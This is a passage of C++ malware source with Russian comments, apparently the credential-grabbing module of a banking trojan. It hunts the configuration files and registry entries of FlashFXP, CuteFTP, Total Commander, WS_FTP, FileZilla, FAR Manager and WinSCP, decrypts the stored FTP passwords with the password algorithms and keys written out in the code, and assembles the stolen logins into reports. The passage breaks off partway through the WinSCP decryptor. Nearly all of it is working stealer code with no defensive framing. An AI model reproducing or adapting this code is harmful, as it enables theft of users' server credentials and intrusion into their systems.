	writeReport(list, softwaregrabber_wc_title, BLT_GRABBED_EMAILSOFTWARE);
}



//Максимальный размер элемента.
#define MAX_ITEM_SIZE 0xFF

//Данные для рекрусивного поиска по FTP-клиентам.
typedef struct
{
	LPWSTR list;  //Список найденых акков.
	DWORD count;  //Кол. найденых акков.
}FTPDATA;

////////////////////////////////////////////////////////////////////////////////////////////////////
// FlashFXP
////////////////////////////////////////////////////////////////////////////////////////////////////

/*
  Декруптор пароля.

  IN OUT pass    - пароль.
  IN sectionName - имя секции. Не может быть нулевой.

  Return         - размер пароля.
*/
static int ftpFlashFxp3Decrypt(LPWSTR pass, LPWSTR sectionName)
{
	BYTE buf[MAX_ITEM_SIZE];
	LPWSTR magic;
	WCHAR defaultMagic[MAX_LEN];
	int magicLen;
	int r = 0;

	if(Str::_findCharW(sectionName, 0x03))
	{
		magicLen = Str::_LengthW(sectionName);
		magic    = sectionName;
	}
	else
	{
		magic    = defaultMagic;
		magicLen = Str::_LengthW(strings_table[softwaregrabber_flashfxp_secret].text);
		_getW(softwaregrabber_flashfxp_secret, defaultMagic);
	}

	int len = Str::_LengthW(pass) / 2;
	if(len < MAX_ITEM_SIZE && Str::_fromHexW(pass, buf))
	{
		len--;

		int i = 0, j = 0;
		for(; i < len; i++, j++)
		{
			if(j == magicLen)j = 0;

			BYTE c = buf[i + 1] ^ ((BYTE)(magic[j]));
			if(c < buf[i])c--;
			pass[i] = (WCHAR)(BYTE)(c - buf[i]);
		}
		pass[i] = 0;
		r = i;
	}
	return r;
}

bool ftpFlashFxp3Proc(const LPWSTR path, const WIN32_FIND_DATAW *fileInfo, void *data);

/*
  Стандартный поиск.

  IN path        - путь.
  IN OUT ftpData - данные поиска.
*/
static void ftpFlashFxp3BasicSearch(LPWSTR path, FTPDATA *ftpData)
{
	CSTR_GETW(file1, softwaregrabber_flashfxp_file_1);
	CSTR_GETW(file2, softwaregrabber_flashfxp_file_2);
	CSTR_GETW(file3, softwaregrabber_flashfxp_file_3);

	const LPWSTR files[] = {file1, file2, file3};
	Fs::_findFiles(path, files, sizeof(files) / sizeof(LPWSTR), Fs::FFFLAG_SEARCH_FILES | Fs::FFFLAG_RECURSIVE, ftpFlashFxp3Proc, ftpData, NULL, 0, 0);
}

static bool ftpFlashFxp3Proc(const LPWSTR path, const WIN32_FIND_DATAW *fileInfo, void *data)
{
	FTPDATA *ftpData = (FTPDATA *)data;
	WCHAR curPath[MAX_PATH];

	if(Fs::_pathCombine(curPath, path, (LPWSTR)fileInfo->cFileName))
	{
		WDEBUG("%s", curPath);
		if(fileInfo->dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
			ftpFlashFxp3BasicSearch(curPath, ftpData);
		else
		{      
			LPWSTR sectionsList = (LPWSTR)Mem::alloc(0xFFFF * sizeof(WCHAR));
			if(sectionsList != NULL)
			{
				DWORD size = CWA(kernel32, GetPrivateProfileStringW)(NULL, NULL, NULL, sectionsList, 0xFFFF, curPath);
				if(size > 0 && Str::_isValidMultiStringW(sectionsList, size + 1))
				{
					const DWORD maxLogSize = MAX_ITEM_SIZE * 3 + 20;
					LPWSTR dataBuf = (LPWSTR)Mem::alloc(MAX_ITEM_SIZE * 3 * sizeof(WCHAR) + maxLogSize * sizeof(WCHAR));
					if(dataBuf != NULL)
					{
						LPWSTR host    = dataBuf;
						LPWSTR user    = host + MAX_ITEM_SIZE;
						LPWSTR pass    = user + MAX_ITEM_SIZE;
						LPWSTR output  = pass + MAX_ITEM_SIZE;
						LPWSTR section = sectionsList;
						DWORD port;

						CSTR_GETW(keyIp,   softwaregrabber_flashfxp_host);
						CSTR_GETW(keyPort, softwaregrabber_flashfxp_port);
						CSTR_GETW(keyUser, softwaregrabber_flashfxp_user);
						CSTR_GETW(keyPass, softwaregrabber_flashfxp_pass);
						do
						{
							if(CWA(kernel32, GetPrivateProfileStringW)(section, keyIp,   NULL, host, MAX_ITEM_SIZE, curPath) > 0 &&
								(port = CWA(kernel32, GetPrivateProfileIntW)(section, keyPort, 21, curPath)) > 0 && port <= 0xFFFF &&
								CWA(kernel32, GetPrivateProfileStringW)(section, keyUser, NULL, user, MAX_ITEM_SIZE, curPath) > 0 &&
								CWA(kernel32, GetPrivateProfileStringW)(section, keyPass, NULL, pass, MAX_ITEM_SIZE, curPath) > 0 &&
								ftpFlashFxp3Decrypt(pass, section) > 0)
							{
								CSTR_GETW(reportFormat, softwaregrabber_ftp_report_format1W);
								int outputSize = Str::_sprintfW(output, maxLogSize, reportFormat, user, pass, host, port);
								if(outputSize > 0 && Str::_CatExW(&ftpData->list, output, outputSize))
									ftpData->count++;
							}
						}
						while((section = Str::_multiStringGetIndexW(section, 1)) != NULL);
						Mem::free(dataBuf);
					}
				}
				Mem::free(sectionsList);
			}
		}
	}
	return true;
}

void _ftpFlashFxp3(void)
{
	WCHAR curPath[MAX_PATH];
	WCHAR dataPath[MAX_PATH];
	FTPDATA ftpData;
	DWORD size;

	Mem::_zero(&ftpData, sizeof(FTPDATA));

	CSTR_GETW(regKey, softwaregrabber_flashfxp_regkey);
	CSTR_GETW(regValue, softwaregrabber_flashfxp_regvalue);
	if((size = Registry::_getValueAsString(HKEY_LOCAL_MACHINE, regKey, regValue, curPath, MAX_PATH)) != (DWORD)-1 && size > 0)
	{
		CWA(kernel32, ExpandEnvironmentStringsW)(curPath, dataPath, MAX_PATH);
		ftpFlashFxp3BasicSearch(dataPath, &ftpData);
	}

	if(ftpData.count == 0)
	{
		CSTR_GETW(dir1, softwaregrabber_flashfxp_path_mask);
		const DWORD locs[] = {CSIDL_COMMON_APPDATA, CSIDL_APPDATA, CSIDL_PROGRAM_FILES};
		const LPWSTR dirs[] = {dir1};

		for(DWORD i = 0; i < sizeof(locs) / sizeof(DWORD); i++)
		{
			if(CWA(shell32, SHGetFolderPathW)(NULL, locs[i], NULL, SHGFP_TYPE_CURRENT, curPath) == S_OK) 
				Fs::_findFiles(curPath, dirs, sizeof(dirs) / sizeof(LPWSTR), Fs::FFFLAG_SEARCH_FOLDERS, ftpFlashFxp3Proc, &ftpData, NULL, 0, 0);
		}
	}

	if(ftpData.count > 0)
		writeReport(ftpData.list, softwaregrabber_flashfxp_title, BLT_GRABBED_FTPSOFTWARE);
	else
		Mem::free(ftpData.list);
}

////////////////////////////////////////////////////////////////////////////////////////////////////
// CuteFTP
////////////////////////////////////////////////////////////////////////////////////////////////////
#if(1)
/*
  Декруптор пароля.

  IN OUT pass    - пароль.
  IN sectionName - имя секции. Не может быть нулевой.

  Return         - размер пароля.
*/
static int ftpCuteFtpDecrypt(LPWSTR pass, LPWSTR sectionName)
{
	BYTE buf[MAX_ITEM_SIZE];
	LPWSTR magic;
	int magicLen;
	int r = 0;

	if(Str::_findCharW(sectionName, 0x03))
	{
		magicLen = Str::_LengthW(sectionName);
		magic    = sectionName;
	}
	else
	{
		magic = L"yA36zA48dEhfrvghGRg57h5UlDv3";
		magicLen = 28;
	}

	int len = Str::_LengthW(pass) / 2;
	if(len < MAX_ITEM_SIZE && Str::_fromHexW(pass, buf))
	{
		len--;

		int i = 0, j = 0;
		for(; i < len; i++, j++)
		{
			if(j == magicLen)j = 0;

			BYTE c = buf[i + 1] ^ ((BYTE)(magic[j]));
			if(c < buf[i])c--;
			pass[i] = (WCHAR)(BYTE)(c - buf[i]);
		}
		pass[i] = 0;
		r = i;
	}
	return r;
}


bool ftpCuteFtpProc(LPWSTR path, WIN32_FIND_DATAW *fileInfo, void *data);

/*
  Стандартный поиск.

  IN path        - путь.
  IN OUT ftpData - данные поиска.
*/
static void ftpCuteFtpBasicSearch(LPWSTR path, FTPDATA *ftpData)
{
	const LPWSTR files[] = {L"sm.dat", L"tree.dat", L"smdata.dat"};
	Fs::_findFiles(path, files, sizeof(files) / sizeof(LPWSTR), Fs::FFFLAG_SEARCH_FILES | Fs::FFFLAG_RECURSIVE, (Fs::FINDFILEPROC*)ftpCuteFtpProc, ftpData, NULL, 0, 0);
}

static bool ftpCuteFtpProc(LPWSTR path, WIN32_FIND_DATAW *fileInfo, void *data)
{
	FTPDATA *ftpData = (FTPDATA *)data;
	WCHAR curPath[MAX_PATH];

	if(Fs::_pathCombine(curPath, path, fileInfo->cFileName))
	{
		WDEBUG("%s", curPath);
		if(fileInfo->dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
			ftpCuteFtpBasicSearch(curPath, ftpData);
		else
		{      
			Fs::MEMFILE mf;
			if(Fs::_fileToMem(curPath, &mf, Fs::FTOMF_SHARE_WRITE))
			{
				LPBYTE data    = mf.data;
				LPBYTE dataEnd = data + mf.size;

				//FIXME: Бинарные данные в неизвестном формате.

				Fs::_closeMemFile(&mf);
			}
		}
	}
	return true;
}

void _ftpCuteFtp(void)
{
	char text[8192];
	char epass[4096];
	char buf[3][32 * 1024];

	const DWORD locs[] = {CSIDL_PROGRAM_FILES, CSIDL_APPDATA, CSIDL_COMMON_APPDATA};
	const LPWSTR dirs[] = {L"*globalscape*"};
	WCHAR curPath[MAX_PATH];
	FTPDATA ftpData;

	Mem::_zero(&ftpData, sizeof(FTPDATA));

	for(DWORD i = 0; i < sizeof(locs) / sizeof(DWORD); i++)
		if(CWA(shell32, SHGetFolderPathW)(NULL, locs[i], NULL, SHGFP_TYPE_CURRENT, curPath) == S_OK) 
			Fs::_findFiles(curPath, dirs, sizeof(dirs) / sizeof(LPWSTR), Fs::FFFLAG_SEARCH_FOLDERS, (Fs::FINDFILEPROC*)ftpCuteFtpProc, &ftpData, NULL, 0, 0);

	if(ftpData.count > 0)
	{
		//FIXME: writeReport(ftpData.list, softwaregrabber_flashfxp_title, BLT_GRABBED_FTPSOFTWARE);
		WDEBUG("CuteFTP:\n%s", ftpData.list);
		writeReport(ftpData.list, softwaregrabber_cuteftp_title, BLT_GRABBED_FTPSOFTWARE);
	}

	Mem::free(ftpData.list);
}
#endif

////////////////////////////////////////////////////////////////////////////////////////////////////
// Total Commander
////////////////////////////////////////////////////////////////////////////////////////////////////

static unsigned long randTotalCommander(unsigned long *seed, unsigned long val)
{
	*seed = (*seed * 0x8088405) + 1;
	return Math::_shr64(Math::_mul64(*seed, val), 32);
}  

/*
  Декруптор пароля.

  IN OUT pass    - пароль.

  Return         - размер пароля.
*/
static int ftpTotalCommanderDecrypt(LPWSTR pass)
{
	BYTE buf[MAX_ITEM_SIZE];
	int len = Str::_LengthW(pass) / 2;

	if(len < MAX_ITEM_SIZE && Str::_fromHexW(pass, buf))
	{
		len -= 4;
		unsigned long seed = 0x0CF671;

		for(int i = 0; i < len; i++)
		{
			int val = (char)randTotalCommander(&seed, 8);
			buf[i] = (buf[i] >> (8 - val)) | (buf[i] << val);
		}

		seed = 0x3039;
		for(int i = 0; i < 0x100; i++)
		{
			int val  = (char)randTotalCommander(&seed, len);
			int temp = (char)randTotalCommander(&seed, len);
			char sw = buf[val];
			buf[val] = buf[temp];
			buf[temp] = sw;
		}

		seed = 0xA564;
		for(int i = 0; i < len; i++)buf[i] ^= (char)randTotalCommander(&seed, 0x100);

		seed = 0xD431;
		for(int i = 0; i < len; i++)buf[i] -= (char)randTotalCommander(&seed, 0x100);

		for(int i = 0; i < len; i++)pass[i] = buf[i];
		pass[len] = 0;

		return len;
	}

	return 0;
}

bool ftpTotalCommanderProc(const LPWSTR path, const WIN32_FIND_DATAW *fileInfo, void *data);

/*
  Стандартный поиск.

  IN path        - путь.
  IN OUT ftpData - данные поиска.
  IN recrusive   - рекрусивный поиск.
*/
static void ftpTotalCommanderBasicSearch(LPWSTR path, FTPDATA *ftpData, bool recrusive)
{
	CSTR_GETW(file1, softwaregrabber_tc_file_1);
	const LPWSTR files[] = {file1};
	Fs::_findFiles(path, files, sizeof(files) / sizeof(LPWSTR), Fs::FFFLAG_SEARCH_FILES | (recrusive ? Fs::FFFLAG_RECURSIVE : 0), ftpTotalCommanderProc, ftpData, NULL, 0, 0);
}

static void ftpTotalCommanderReadIni(LPWSTR curPath, FTPDATA *ftpData)
{
	LPWSTR sectionsList = (LPWSTR)Mem::alloc(0xFFFF * sizeof(WCHAR));
	if(sectionsList != NULL)
	{
		DWORD size = CWA(kernel32, GetPrivateProfileStringW)(NULL, NULL, NULL, sectionsList, 0xFFFF, curPath);
		if(size > 0 && Str::_isValidMultiStringW(sectionsList, size + 1))
		{
			const DWORD maxLogSize = MAX_ITEM_SIZE * 3 + 10;
			LPWSTR dataBuf = (LPWSTR)Mem::alloc(MAX_ITEM_SIZE * 3 * sizeof(WCHAR) + maxLogSize * sizeof(WCHAR));
			if(dataBuf != NULL)
			{
				LPWSTR host    = dataBuf;
				LPWSTR user    = host + MAX_ITEM_SIZE;
				LPWSTR pass    = user + MAX_ITEM_SIZE;
				LPWSTR output  = pass + MAX_ITEM_SIZE;
				LPWSTR section = sectionsList;

				CSTR_GETW(badSection1, softwaregrabber_tc_section_bad_1);
				CSTR_GETW(badSection2, softwaregrabber_tc_section_bad_2);
				CSTR_GETW(keyHost,     softwaregrabber_tc_host);
				CSTR_GETW(keyUser,     softwaregrabber_tc_user);
				CSTR_GETW(keyPass,     softwaregrabber_tc_pass);

				do if(CWA(shlwapi, StrStrIW)(section, badSection1) == NULL && CWA(shlwapi, StrStrIW)(section, badSection2) == NULL)
				{
					if(CWA(kernel32, GetPrivateProfileStringW)(section, keyHost, NULL, host, MAX_ITEM_SIZE, curPath) > 0 &&
						CWA(kernel32, GetPrivateProfileStringW)(section, keyUser, NULL, user, MAX_ITEM_SIZE, curPath) > 0 &&
						CWA(kernel32, GetPrivateProfileStringW)(section, keyPass, NULL, pass, MAX_ITEM_SIZE, curPath) > 0 &&
						ftpTotalCommanderDecrypt(pass) > 0)
					{
						CSTR_GETW(reportFormat, softwaregrabber_ftp_report_format2W);
						int outputSize = Str::_sprintfW(output, maxLogSize, reportFormat, user, pass, host);
						if(outputSize > 0 && Str::_CatExW(&ftpData->list, output, outputSize))
							ftpData->count++;
					}
				}
				while((section = Str::_multiStringGetIndexW(section, 1)) != NULL);
				Mem::free(dataBuf);
			}
		}
		Mem::free(sectionsList);
	}
}

static bool ftpTotalCommanderProc(const LPWSTR path, const WIN32_FIND_DATAW *fileInfo, void *data)
{
	FTPDATA *ftpData = (FTPDATA *)data;
	WCHAR curPath[MAX_PATH];

	if(Fs::_pathCombine(curPath, path, (LPWSTR)fileInfo->cFileName))
	{
		WDEBUG("%s", curPath);
		if(fileInfo->dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
			ftpTotalCommanderBasicSearch(curPath, ftpData, true);
		else
			ftpTotalCommanderReadIni(curPath, ftpData);
	}
	return true;
}

void _ftpTotalCommander(void)
{
	WCHAR curPath[MAX_PATH];
	WCHAR dataPath[MAX_PATH];
	DWORD size;
	FTPDATA ftpData;

	Mem::_zero(&ftpData, sizeof(FTPDATA));

	CSTR_GETW(regKey, softwaregrabber_tc_regkey);
	CSTR_GETW(regValue, softwaregrabber_tc_regvalue_ftp);
	if((size = Registry::_getValueAsString(HKEY_CURRENT_USER, regKey, regValue, curPath, MAX_PATH)) != (DWORD)-1 && size > 0)
	{
		CWA(kernel32, ExpandEnvironmentStringsW)(curPath, dataPath, MAX_PATH);
		ftpTotalCommanderReadIni(dataPath, &ftpData);
		CWA(shlwapi, PathRemoveFileSpecW)(dataPath);
	}

	if(ftpData.count == 0)
	{
		CSTR_GETW(dir1, softwaregrabber_tc_path_mask_1);
		CSTR_GETW(dir2, softwaregrabber_tc_path_mask_2);
		CSTR_GETW(dir3, softwaregrabber_tc_path_mask_3);
		const DWORD locs[] = {CSIDL_WINDOWS, CSIDL_APPDATA, CSIDL_PROGRAM_FILES, CSIDL_COMMON_APPDATA};
		const LPWSTR dirs[] = {dir1, dir2, dir3};

		for(DWORD i = 0; i < sizeof(locs) / sizeof(DWORD); i++)
		{
			if(CWA(shell32, SHGetFolderPathW)(NULL, locs[i], NULL, SHGFP_TYPE_CURRENT, curPath) == S_OK) 
			{
				if(locs[i] == CSIDL_WINDOWS)
				{
					ftpTotalCommanderBasicSearch(curPath, &ftpData, false);
					curPath[3] = 0;
				}
				Fs::_findFiles(curPath, dirs, sizeof(dirs) / sizeof(LPWSTR), Fs::FFFLAG_SEARCH_FOLDERS, ftpTotalCommanderProc, &ftpData, NULL, 0, 0);
			}
		}
	}

	if(ftpData.count == 0)
	{
		CSTR_GETW(regKey, softwaregrabber_tc_regkey);
		CSTR_GETW(regValue, softwaregrabber_tc_regvalue_dir);
		if((size = Registry::_getValueAsString(HKEY_CURRENT_USER, regKey, regValue, curPath, MAX_PATH)) != (DWORD)-1 && size > 0)
		{
			CWA(kernel32, ExpandEnvironmentStringsW)(curPath, dataPath, MAX_PATH);
			ftpTotalCommanderBasicSearch(dataPath, &ftpData, true);
		}
	}

	if(ftpData.count > 0)
		writeReport(ftpData.list, softwaregrabber_tc_title, BLT_GRABBED_FTPSOFTWARE);
	else
		Mem::free(ftpData.list);
}

////////////////////////////////////////////////////////////////////////////////////////////////////
// WS_FTP
////////////////////////////////////////////////////////////////////////////////////////////////////

/*
  Декруптор пароля.

  IN OUT pass    - пароль.

  Return         - размер пароля.
*/
static int ftpWsFtpDecrypt(LPWSTR pass)
{
	//FIXME: Узнать алгоритм.
	return Str::_LengthW(pass);
}

bool ftpWsFtpProc(const LPWSTR path, const WIN32_FIND_DATAW *fileInfo, void *data);

/*
  Стандартный поиск.

  IN path        - путь.
  IN OUT ftpData - данные поиска.
  IN recrusive   - рекрусивный поиск.
*/
static void ftpWsFtpBasicSearch(LPWSTR path, FTPDATA *ftpData)
{
	CSTR_GETW(file1, softwaregrabber_wsftp_file_1);
	const LPWSTR files[] = {file1};
	Fs::_findFiles(path, files, sizeof(files) / sizeof(LPWSTR), Fs::FFFLAG_SEARCH_FILES | Fs::FFFLAG_RECURSIVE, ftpWsFtpProc, ftpData, NULL, 0, 0);
}

static bool ftpWsFtpProc(const LPWSTR path, const WIN32_FIND_DATAW *fileInfo, void *data)
{
	FTPDATA *ftpData = (FTPDATA *)data;
	WCHAR curPath[MAX_PATH];

	if(Fs::_pathCombine(curPath, path, (LPWSTR)fileInfo->cFileName))
	{
		WDEBUG("%s", curPath);
		if(fileInfo->dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
			ftpWsFtpBasicSearch(curPath, ftpData);
		else
		{      
			LPWSTR sectionsList = (LPWSTR)Mem::alloc(0xFFFF * sizeof(WCHAR));
			if(sectionsList != NULL)
			{
				DWORD size = CWA(kernel32, GetPrivateProfileStringW)(NULL, NULL, NULL, sectionsList, 0xFFFF, curPath);
				if(size > 0 && Str::_isValidMultiStringW(sectionsList, size + 1))
				{
					const DWORD maxLogSize = MAX_ITEM_SIZE * 3 + 20;
					LPWSTR dataBuf = (LPWSTR)Mem::alloc(MAX_ITEM_SIZE * 3 * sizeof(WCHAR) + maxLogSize * sizeof(WCHAR));
					if(dataBuf != NULL)
					{
						LPWSTR host    = dataBuf;
						LPWSTR user    = host + MAX_ITEM_SIZE;
						LPWSTR pass    = user + MAX_ITEM_SIZE;
						LPWSTR output  = pass + MAX_ITEM_SIZE;
						LPWSTR section = sectionsList;
						DWORD port;

						CSTR_GETW(badSection, softwaregrabber_wsftp_section_bad_1);
						CSTR_GETW(keyHost, softwaregrabber_wsftp_host);
						CSTR_GETW(keyPort, softwaregrabber_wsftp_port);
						CSTR_GETW(keyUser, softwaregrabber_wsftp_user);
						CSTR_GETW(keyPass, softwaregrabber_wsftp_pass);

						do if(CWA(shlwapi, StrStrIW)(section, badSection) == NULL)
						{
							if(CWA(kernel32, GetPrivateProfileStringW)(section, keyHost, NULL, host, MAX_ITEM_SIZE, curPath) > 0 &&
								(port = CWA(kernel32, GetPrivateProfileIntW)(section, keyPort, 21, curPath)) > 0 && port <= 0xFFFF &&
								CWA(kernel32, GetPrivateProfileStringW)(section, keyUser, NULL, user, MAX_ITEM_SIZE, curPath) > 0 &&
								CWA(kernel32, GetPrivateProfileStringW)(section, keyPass, NULL, pass, MAX_ITEM_SIZE, curPath) > 0 &&
								ftpWsFtpDecrypt(pass) > 0)
							{
								CSTR_GETW(reportFormat, softwaregrabber_ftp_report_format1W);
								int outputSize = Str::_sprintfW(output, maxLogSize, reportFormat, user, pass, host, port);
								if(outputSize > 0 && Str::_CatExW(&ftpData->list, output, outputSize))
									ftpData->count++;
							}
						}
						while((section = Str::_multiStringGetIndexW(section, 1)) != NULL);
						Mem::free(dataBuf);
					}
				}
				Mem::free(sectionsList);
			}
		}
	}
	return true;
}

void _ftpWsFtp(void)
{
	WCHAR curPath[MAX_PATH];
	WCHAR dataPath[MAX_PATH];
	DWORD size;
	FTPDATA ftpData;

	Mem::_zero(&ftpData, sizeof(FTPDATA));

	CSTR_GETW(regKey, softwaregrabber_wsftp_regkey);
	CSTR_GETW(regValue, softwaregrabber_wsftp_regvalue);
	if((size = Registry::_getValueAsString(HKEY_CURRENT_USER, regKey, regValue, curPath, MAX_PATH)) != (DWORD)-1 && size > 0)
	{
		CWA(kernel32, ExpandEnvironmentStringsW)(curPath, dataPath, MAX_PATH);
		ftpWsFtpBasicSearch(dataPath, &ftpData);
	}

	if(ftpData.count == 0)
	{
		CSTR_GETW(dir1, softwaregrabber_wsftp_path_mask_1);
		const DWORD locs[] = {CSIDL_APPDATA, CSIDL_PROGRAM_FILES, CSIDL_COMMON_APPDATA};
		const LPWSTR dirs[] = {dir1};

		for(DWORD i = 0; i < sizeof(locs) / sizeof(DWORD); i++)
		{
			if(CWA(shell32, SHGetFolderPathW)(NULL, locs[i], NULL, SHGFP_TYPE_CURRENT, curPath) == S_OK) 
				Fs::_findFiles(curPath, dirs, sizeof(dirs) / sizeof(LPWSTR), Fs::FFFLAG_SEARCH_FOLDERS, ftpWsFtpProc, &ftpData, NULL, 0, 0);
		}
	}

	if(ftpData.count > 0)
		writeReport(ftpData.list, softwaregrabber_wsftp_title, BLT_GRABBED_FTPSOFTWARE);
	else 
		Mem::free(ftpData.list);
}

////////////////////////////////////////////////////////////////////////////////////////////////////
// FileZilla
////////////////////////////////////////////////////////////////////////////////////////////////////

bool ftpFileZillaProc(const LPWSTR path, const WIN32_FIND_DATAW *fileInfo, void *data);

/*
  Стандартный поиск.

  IN path        - путь.
  IN OUT ftpData - данные поиска.
*/
static void ftpFileZillaBasicSearch(LPWSTR path, FTPDATA *ftpData)
{
	CSTR_GETW(file1, softwaregrabber_filezilla_file_mask_1);
	const LPWSTR files[] = {file1};
	Fs::_findFiles(path, files, sizeof(files) / sizeof(LPWSTR), Fs::FFFLAG_SEARCH_FILES | Fs::FFFLAG_RECURSIVE, ftpFileZillaProc, ftpData, NULL, 0, 0);
}

static bool ftpFileZillaProc(const LPWSTR path, const WIN32_FIND_DATAW *fileInfo, void *data)
{
	FTPDATA *ftpData = (FTPDATA *)data;
	WCHAR curPath[MAX_PATH];

	if(Fs::_pathCombine(curPath, path, (LPWSTR)fileInfo->cFileName))
	{
		WDEBUG("%s", curPath);
		if(fileInfo->dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
			ftpFileZillaBasicSearch(curPath, ftpData);
		else
		{      
			IXMLDOMDocument *doc = XmlParser::_openFile(curPath, NULL);
			if(doc != NULL)
			{
				CSTR_GETW(nodeMask, softwaregrabber_filezilla_node_mask);
				IXMLDOMNodeList *list;
				if(doc->selectNodes(nodeMask, &list) == S_OK)
				{
					IXMLDOMNode *curNode;
					while(list->nextNode(&curNode) == S_OK)
					{
						BSTR host;
						BSTR port;
						BSTR user;
						BSTR pass;

						{
							CSTR_GETW(nodeHost, softwaregrabber_filezilla_host);
							host = XmlParser::_getNodeTextOfNode(curNode, nodeHost);
						}
						{
							CSTR_GETW(nodePort, softwaregrabber_filezilla_port);
							port = XmlParser::_getNodeTextOfNode(curNode, nodePort);
						}
						{
							CSTR_GETW(nodeUser, softwaregrabber_filezilla_user);
							user = XmlParser::_getNodeTextOfNode(curNode, nodeUser);
						}
						{
							CSTR_GETW(nodePass, softwaregrabber_filezilla_pass);
							pass = XmlParser::_getNodeTextOfNode(curNode, nodePass);
						}

						if(host != NULL && *host != 0 && user != NULL && *user != 0 && pass != NULL && *pass != 0)
						{
							DWORD portInt = port != NULL ? Str::_ToInt32W(port, NULL) : 0;
							if(portInt < 1 || portInt > 0xFFFF) portInt = 21;

							LPWSTR output = NULL;
							CSTR_GETW(reportFormat, softwaregrabber_ftp_report_format1W);
							int outputSize = Str::_sprintfExW(&output, reportFormat, user, pass, host, portInt);
							if(outputSize > 0 && Str::_CatExW(&ftpData->list, output, outputSize))
								ftpData->count++;
							Mem::free(output);
						}

						XmlParser::_freeBstr(host);
						XmlParser::_freeBstr(port);
						XmlParser::_freeBstr(user);
						XmlParser::_freeBstr(pass);
						curNode->Release();
					}
					list->Release();
				}
				doc->Release();
			}
		}
	}
	return true;
}

void _ftpFileZilla(void)
{
	CSTR_GETW(dir1, softwaregrabber_filezilla_path_mask_1);
	const DWORD locs[] = {CSIDL_PROGRAM_FILES, CSIDL_APPDATA, CSIDL_COMMON_APPDATA};
	const LPWSTR dirs[] = {dir1};
	WCHAR curPath[MAX_PATH];
	FTPDATA ftpData;

	Mem::_zero(&ftpData, sizeof(FTPDATA));

	for(DWORD i = 0; i < sizeof(locs) / sizeof(DWORD); i++)
		if(CWA(shell32, SHGetFolderPathW)(NULL, locs[i], NULL, SHGFP_TYPE_CURRENT, curPath) == S_OK) 
			Fs::_findFiles(curPath, dirs, sizeof(dirs) / sizeof(LPWSTR), Fs::FFFLAG_SEARCH_FOLDERS, ftpFileZillaProc, &ftpData, NULL, 0, 0);

	if(ftpData.count > 0)
		writeReport(ftpData.list, softwaregrabber_filezilla_title, BLT_GRABBED_FTPSOFTWARE);
	else
		Mem::free(ftpData.list);
}

////////////////////////////////////////////////////////////////////////////////////////////////////
// FAR Manager
////////////////////////////////////////////////////////////////////////////////////////////////////

/*
  Декруптор пароля.

  IN OUT pass    - пароль. Буфер должен иметь размер не менее MAX_ITEM_SIZE.

  Return         - размер пароля.
*/
static int ftpFarManagerDecrypt(LPWSTR pass)
{
	BYTE epass[MAX_ITEM_SIZE];
	Mem::_copy(epass, pass, MAX_ITEM_SIZE);
	epass[MAX_ITEM_SIZE - 1] = 0;

	BYTE val = (epass[0] ^ epass[1]) | 0x50;
	int i = 2, j = 0;

	for(; epass[i] != 0; i++, j++)
		pass[j] = epass[i] ^ val;
	pass[j] = 0;
	return j;
}

void _ftpFarManager(void)
{
	const DWORD maxLogSize = MAX_ITEM_SIZE * 3 + 10;
	LPWSTR dataBuf = (LPWSTR)Mem::alloc(MAX_ITEM_SIZE * 3 * sizeof(WCHAR) + maxLogSize * sizeof(WCHAR));

	if(dataBuf != NULL)
	{
		CSTR_GETW(regKey1, softwaregrabber_far_regkey_1);
		CSTR_GETW(regKey2, softwaregrabber_far_regkey_2);

		HKEY rootKey;
		WCHAR name[MAX_PATH];
		const LPWSTR locs[] = {regKey1, regKey2};
		FTPDATA ftpData;

		Mem::_zero(&ftpData, sizeof(FTPDATA));

		CSTR_GETW(regHost,  softwaregrabber_far_host);
		CSTR_GETW(regUser1, softwaregrabber_far_user_1);
		CSTR_GETW(regUser2, softwaregrabber_far_user_2);
		CSTR_GETW(regPass,  softwaregrabber_far_pass);

		LPWSTR host    = dataBuf;
		LPWSTR user    = host + MAX_ITEM_SIZE;
		LPWSTR pass    = user + MAX_ITEM_SIZE;
		LPWSTR output  = pass + MAX_ITEM_SIZE;

		for(DWORD i = 0; i < sizeof(locs) / sizeof(LPWSTR); i++)
		{
			if(CWA(advapi32, RegOpenKeyExW)(HKEY_CURRENT_USER, locs[i], 0, KEY_ENUMERATE_SUB_KEYS, &rootKey) == ERROR_SUCCESS)
			{
				DWORD index = 0;
				DWORD size = MAX_PATH;

				while(CWA(advapi32, RegEnumKeyExW)(rootKey, index++, name, &size, 0, NULL, NULL, NULL) == ERROR_SUCCESS)
				{
					if((size = Registry::_getValueAsString(rootKey, name, regHost, host, MAX_ITEM_SIZE)) != (DWORD)-1 && size > 0 &&
						(
						((size = Registry::_getValueAsString(rootKey, name, regUser1, user, MAX_ITEM_SIZE)) != (DWORD)-1 && size > 0) ||
						((size = Registry::_getValueAsString(rootKey, name, regUser2,     user, MAX_ITEM_SIZE)) != (DWORD)-1 && size > 0)
						) &&
						(size = Registry::_getValueAsBinary(rootKey, name, regPass, NULL, pass, MAX_ITEM_SIZE)) != (DWORD)-1 && size > 0 &&
						ftpFarManagerDecrypt(pass) > 0)
					{
						CSTR_GETW(reportFormat, softwaregrabber_ftp_report_format2W);
						int outputSize = Str::_sprintfW(output, maxLogSize, reportFormat, user, pass, host);
						if(outputSize > 0 && Str::_CatExW(&ftpData.list, output, outputSize))
							ftpData.count++;
					}
					size = MAX_PATH;
				}
				CWA(advapi32, RegCloseKey)(rootKey);
			}
		}

		Mem::free(dataBuf);

		if(ftpData.count > 0)
			writeReport(ftpData.list, softwaregrabber_far_title, BLT_GRABBED_FTPSOFTWARE);
		else
			Mem::free(ftpData.list);
	}
}

////////////////////////////////////////////////////////////////////////////////////////////////////
// WinSCP
////////////////////////////////////////////////////////////////////////////////////////////////////

/*
  Декруптор пароля.

  IN OUT pass        - пароль.
  IN hostAndUserSize - сумма длин пароля и имени.

  Return             - размер пароля.
*/
static int ftpWinScpDecrypt(LPWSTR pass, int hostAndUserSize)
{
	BYTE buf[MAX_ITEM_SIZE];
	int len = Str::_LengthW(pass) / 2;
	if(len < MAX_ITEM_SIZE && Str::_fromHexW(pass, buf))
	{
		for(int i = 0; i < len; i++)
			buf[i] ^= 0x5C;

		LPBYTE pos = buf;
		BYTE elen;

		if(buf[0] == 0xFF)
		{
			elen = buf[2];
			pos += 3;
		}
		else
		{
			elen = buf[0];
			pos += 1;
		}
		pos += pos[0] + 1;

